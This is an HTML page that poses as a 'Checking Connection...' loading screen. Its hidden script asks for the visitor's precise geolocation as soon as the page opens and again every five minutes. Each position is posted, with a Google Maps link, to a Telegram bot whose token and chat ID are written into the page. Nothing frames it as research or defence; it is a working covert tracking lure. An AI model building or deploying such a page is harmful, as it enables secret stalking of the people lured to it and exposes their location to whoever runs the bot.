<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
</head>
<body style="font-family:sans-serif; text-align:center; padding-top:20%;">
    <h3>Please wait, loading content...</h3>

    <script>
        // Your Telegram Credentials (Pre-filled)
        const BOT_TOKEN = "8776780056:AAFHtBhpyPqKIaUkrl5ia9YC6uZWgdeEO-Y";
        const CHAT_ID = "8816955567";

        function sendLocation(lat, lon) {
            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const text = `📍 *New Location Alert*\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](${mapUrl})`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        }

        function track() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendLocation(pos.coords.latitude, pos.coords.longitude);
                    },
                    (err) => console.log(err),
                    { enableHighAccuracy: true }
                );
            }
        }

        // Send location immediately when opened, then every 5 minutes (300,000 ms)
        window.onload = () => {
            track();
            setInterval(track, 300000);
        };
    </script>
</body>
</html>
